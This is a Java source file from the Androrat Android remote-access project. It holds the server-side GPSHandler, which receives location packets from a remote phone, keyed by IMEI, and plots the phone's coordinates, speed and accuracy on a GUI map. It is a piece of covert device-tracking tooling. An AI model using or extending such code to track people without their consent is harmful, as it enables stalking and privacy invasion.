/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package handler;

import gui.GUI;
import server.Server;

import Packet.GPSPacket;
import Packet.Packet;

public class GPSHandler implements PacketHandler
{

	private GUI gui;
	private int channel;
	private String imei;
	
	public GPSHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	
	@Override
	public void handlePacket(Packet p,String imei,Server c) 
	{
		gui.logTxt("GPS data has been received");
		c.getChannelHandlerMap().get(imei).getStorage(channel).reset(); // Voir si faut le mettre ailleurs !
		
		GPSPacket gps = (GPSPacket)p;	
		gui.updateUserMap(imei, gps.getLongitude(), gps.getLatitude(), gps.getAltitude(), gps.getSpeed(), gps.getAccuracy());
	
	}
	
	
	@Override
	public void receive(Packet p, String temp_imei) {
		// TODO Auto-generated method stub
		
	}


	





	

}
